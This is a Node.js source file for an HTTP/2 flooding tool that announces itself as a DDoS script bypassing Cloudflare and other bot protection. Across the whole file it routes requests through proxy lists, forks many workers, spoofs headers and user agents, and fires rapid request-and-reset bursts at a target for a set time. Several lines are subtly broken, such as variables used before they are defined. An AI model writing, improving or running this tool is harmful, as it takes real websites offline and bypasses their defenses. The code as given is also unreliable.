const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const colors = require('colors');
const UserAgent = require('user-agents');
//const errorHandler = error => {
//    console.log(error);
//};
//process.on("uncaughtException", errorHandler);
//process.on("unhandledRejection", errorHandler);

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage: target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }

function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

 function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();

 const ip_spoof2 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 9999);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed2 = ip_spoof2();

 const ip_spoof3 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 118);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed3 = ip_spoof3();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6],
 }
 const sig = [    
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES128-GCM-SHA256"
 ];
const val = { 'NEl': JSON.stringify({
      "report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
      "max-age": Math.random() < 0.5 ? 604800 : 2561000,
      "include_subdomains": Math.random() < 0.5 ? true : false}),
            }

 const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
 ]; 
 lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
 ];
 
 const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate',
 ];
 
 const control_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
 ];
 
 
const platformd = [
 "Windows",
 "Linux",
 "Android",
 "iOS",
 "Mac OS",
 "iPadOS",
 "BlackBerry OS",
 "Firefox OS",
];
const rdom2 = [
"cloudflare is my dog",
"Vietnam on top",
"Kid website",
"captcha is trash",
"dont bully my http ddos",
"client is hard",
"0day script",
];

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var random = rdom2[Math.floor(Math.floor(Math.random() * rdom2.length))];
 var platformx = platformd[Math.floor(Math.floor(Math.random() * platformd.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

const rateHeaders = [
{ "A-IM": "Feed" },
{ "acceptt": accept },
{ "accept-charset": accept },
{ "accept-datetime": accept },
{ "viewport-height":"1080"  },
{ "viewport-width": "1920"  },
];

const rateHeaders2 = [
{ "Via": "1.1 " + parsedTarget.host },
{ "X-Requested-With": "XMLHttpRequest" },
{ "X-Forwarded-Forr": spoofed },
{"NEL" : val},
{"dnt" : "1" },
{ "X-Vercel-Cache": randstr(15) },
{ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=86400" },
{ "TK": "?" },
{ "X-Frame-Options": "deny" },
{ "X-ASP-NET": randstr(25) },
{ "te": "trailers" },
];

const rateHeaders4 = [
{ "accept-encodingg": encoding },
{ "accept-languagee": lang },
{ "Refresh": "5" },
{ "X-Content-duration": spoofed },
{ "device-memory": "0.25"  },
{ "HTTP2-Setting" : Math.random() < 0.5 ? 'token64' : 'token68'},
{ "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
];
const rateHeaders5 = [
{ "upgrade-insecure-requests": "1" },
{ "Access-Control-Request-Method": "GET" },
{ "Cache-Control": "no-cache" },
{ "Content-Encoding": "gzip" },
{ "content-type": "text/html" },
{ "origin": "https://" + parsedTarget.host },
{ "pragma": "no-cache" },
{ "refererer": "https://" + parsedTarget.host + "/" },
];


const browserVersion = getRandomInt(125,130);
    const fwfw = ['Google Chrome'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    let brandValue;
    if (browserVersion === 125) {
        brandValue = `"Not_A Brand";v="99", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 126) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 127) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 128) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 129) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 130) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }

    const userAgent = `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile Safari/537.36`;
   const userAgent1 = `Windows NT 10.0: Win64: x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
  const userAgent3 = `Mozilla/5.0 (iPhone; CPU iPhone OS 1${randstra(1)}_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile/15E148`;
 const userAgent5 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edg/129.0.2792.79`;
 const userAgent6 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edg/${browserVersion}.0.0.0`;
 const userAgent7 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.2352.52 Safari/537.36 Edg/${browserVersion}.0.527.106`;
 const userAgent9 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/${browserVersion}.0.4577.63 Safari/537.36`;
var valueofgod = 1;
                    var signature_0x1 = getRandomInt(82, 110);
                    var cookie;
                    var signature_0x2 = getRandomInt(80, 99);
                    var signature_0x3 = getRandomInt(70, 99);
                     
                     const mobiledd = getRandomInt(0, 1);
                    
                    var randUserAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 Safari/537.36 OPR/${signature_0x2}.0.0.0`
    const secChUa = `${brandValue}`;
const u = [
userAgent,
userAgent1,
userAgent3,
userAgent5,
userAgent6,
userAgent7,
userAgent9,
randUserAgent,
];


const uap = u[Math.floor(Math.random() * u.length)];

 if (cluster.isMaster) {
    console.log(`[!] HTTP/2 | BYPASS HTTP DDOS`.red);
    console.log(`--------------------------------------------`.gray);
    console.log('[>] Target: '.yellow + process.argv[2].cyan);
    console.log('[>] Time: '.magenta + process.argv[3].cyan);
    console.log('[>] Rate: '.blue + process.argv[4].cyan);
    console.log('[>] Thread(s): '.red + process.argv[5].cyan);
    console.log(`Bypass UAM,CF-PRO,BotShield,...`.cyan);
    console.log(`Made by @ThaiDuongScript`.cyan);
    console.log(`--------------------------------------------`.gray);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
 async HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = await net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 600000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
const method = [
"GET",
"POST",
"HEAD",
"CONNECTION",
];
var methods = method[Math.floor(Math.random() * method.length)]

 const path = parsedTarget.path;
 
        const languages = [
     'en-US,en;q=0.9',
     'fr-FR,fr;q=0.9',
     'de-DE,de;q=0.9',
     'es-ES,es;q=0.9',
     'zh-CN,zh;q=0.9',
     'ru-RU,ru;q=0.9',
     'hi-IN,hi;q=0.9',
     'tr-TR,tr;q=0.9',
     'pt-BR,pt;q=0.9',
     'it-IT,it;q=0.9',
     'nl-NL,nl;q=0.9',
     'ko-KR,ko;q=0.9'
];
 const Socker = new NetSocket();
        headers[":method"] = methods;
        headers[":scheme"] = "https";
        headers[":authority"] = parsedTarget.host;
        headers[":path"] = parsedTarget.path;
        headers["user-agent"] = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36 OPR/134.0.0.0`;
        headers["accept"] = Math.random() > 0.5 ? `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7` : "*/*";
        headers["accept-language"] = languages[~~Math.floor(Math.random * languages.length)];
        headers["accept-encoding"] = "gzip, deflate, br, zstd";
        headers["cache-control"] = Math.random() > 0.5 ? 'max-age=0' : 'no-cache';
        headers["sec-ch-ua"] = `"Chromium";v="134", "Opera GX";v="134", "Not)A;Brand";v="99"`;
        headers["priority"] = "u=0, i";
        headers["referer"] = "https://" + parsedTarget.host;
        headers["origin"] = "https://" + parsedTarget.host;
        headers["sec-ch-mobile"] = "?0";
        headers["sec-ch-ua-platform"] = "Android";
        headers["sec-fetch-dest"] = "document";
        headers["sec-fetch-mode"] = "navigate";
        headers["sec-fetch-site"] = "none";
        headers["sec-fetch-user"] = "?1";
        headers["upgrade-insecure-requests"] = "1";
        headers["x-forwarded-for"] = parsedProxy[0];
  function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, async (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            rejectUnauthorized: false,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            socket: connection,
            ecdhCurve: "X25519",
            ciphers: cipper,
            secureProtocol: "TLS_method",
            ALPNProtocols: ['h2'],
            //session: crypto.randomBytes(64),
            //timeout: 1000,
        };

         const tlsConn = await tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = await http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 4096,
            maxConcurrentStreams: 100,
            initialWindowSize: Math.random() < 0.5 ? 65536 :65535,
            maxHeaderListSize: 8192,
            maxFrameSize: Math.random() < 0.5 ? 16777215 : 16384,
            enablePush: false,
          },
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 4096,
            maxConcurrentStreams: 100,
            initialWindowSize: Math.random() < 0.5 ? 65536 :65535,
            maxHeaderListSize: 8192,
            maxFrameSize: Math.random() < 0.5 ? 16777215 : 16384,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = {
                  ...headers,
                  ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
                  ...rateHeaders5[Math.floor(Math.random()*rateHeaders5.length)],
                  ...rateHeaders4[Math.floor(Math.random()*rateHeaders4.length)],
                  ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
                };
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(dynHeaders)
                    
                    client.on("response", response => {
            console.log(`[Duong] ${args.target} ${headers[':status']} ${uap} ${secChUa}`);
                        request.rstStream(http2.constants.NGHTTP2_CANCEL);
                        //request.write(random);
        
const statusCode = error.response ? error.response.statusCode : null;
        if (statusCode === 429) {
      console.log('ratelimit for 10 seconds\r');
      shouldPauseRequests = true;
      setTimeout(() => {
         
          shouldPauseRequests = false;
      },10000);
        }
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
    };
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);
